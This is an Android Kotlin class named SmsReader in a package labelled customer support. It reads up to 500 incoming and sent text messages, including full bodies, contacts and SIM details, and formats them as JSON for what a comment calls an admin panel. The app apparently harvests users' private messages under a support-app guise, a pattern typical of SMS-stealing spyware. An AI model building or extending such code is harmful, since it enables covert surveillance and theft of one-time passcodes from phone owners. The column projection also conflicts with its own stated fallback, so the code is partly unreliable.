package com.customersupport.data

import android.content.ContentResolver
import android.content.Context
import android.database.Cursor
import android.provider.Telephony
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*

class SmsReader(private val context: Context) {
    
    companion object {
        private const val TAG = "SmsReader"
    }

    fun readAllSms(limit: Int = 500): JSONArray {
        val smsArray = JSONArray()

        try {
            val contentResolver: ContentResolver = context.contentResolver
            val halfLimit = limit / 2
            readSmsFromUri(contentResolver, Telephony.Sms.Inbox.CONTENT_URI, "incoming", smsArray, halfLimit)
            readSmsFromUri(contentResolver, Telephony.Sms.Sent.CONTENT_URI, "outgoing", smsArray, halfLimit)
            Log.d(TAG, "Read ${smsArray.length()} SMS messages")
        } catch (e: SecurityException) {
            Log.e(TAG, "Permission denied to read SMS", e)
        } catch (e: Exception) {
            Log.e(TAG, "Error reading SMS", e)
        }

        return smsArray
    }

    private fun readSmsFromUri(
        contentResolver: ContentResolver,
        uri: android.net.Uri,
        type: String,
        smsArray: JSONArray,
        limit: Int
    ) {
        val cursor: Cursor? = contentResolver.query(
            uri,
            arrayOf(
                Telephony.Sms._ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.SUBSCRIPTION_ID,
                Telephony.Sms.SIM_SLOT
            ),
            null,
            null,
            "${Telephony.Sms.DATE} DESC"
        )

        cursor?.use {
            val idIndex = it.getColumnIndex(Telephony.Sms._ID)
            val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
            val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
            val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
            val subIdIndex = it.getColumnIndex(Telephony.Sms.SUBSCRIPTION_ID)
            // SIM_SLOT constant is API 35+; fall back to raw column name on older devices
            var slotIndex = it.getColumnIndex("sim_slot")
            if (slotIndex < 0) {
                slotIndex = try {
                    it.getColumnIndex(Telephony.Sms.SIM_SLOT)
                } catch (e: NoSuchFieldError) {
                    -1
                } catch (e: Exception) {
                    -1
                }
            }
            var count = 0

            while (it.moveToNext() && count < limit) {
                count++
                val id = it.getString(idIndex) ?: ""
                val address = it.getString(addressIndex) ?: "Unknown"
                val body = it.getString(bodyIndex) ?: ""
                val date = it.getLong(dateIndex)
                val subId = if (subIdIndex >= 0) {
                    try { it.getInt(subIdIndex) } catch (e: Exception) { -1 }
                } else -1
                val slot = if (slotIndex >= 0) {
                    try { it.getInt(slotIndex) } catch (e: Exception) { -1 }
                } else -1

                val smsJson = JSONObject().apply {
                    put("id", "${type}_$id")
                    put("sender", if (type == "incoming") address else "Me")
                    put("receiver", if (type == "outgoing") address else "Me")
                    put("message", body)
                    put("timestamp", formatDate(date))
                    put("type", type)
                    // Per-SIM provenance for multi-SIM detection in the admin panel.
                    // -1 / missing = unknown (older Android versions omit these columns).
                    if (subId > 0) put("subscriptionId", subId)
                    if (slot >= 0) {
                        put("slotIndex", slot)
                        put("simSlot", slot)
                    }
                }
                smsArray.put(smsJson)
            }
        }
    }

    private fun formatDate(timestamp: Long): String {
        val sdf = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US)
        sdf.timeZone = TimeZone.getTimeZone("UTC")
        return sdf.format(Date(timestamp))
    }
}
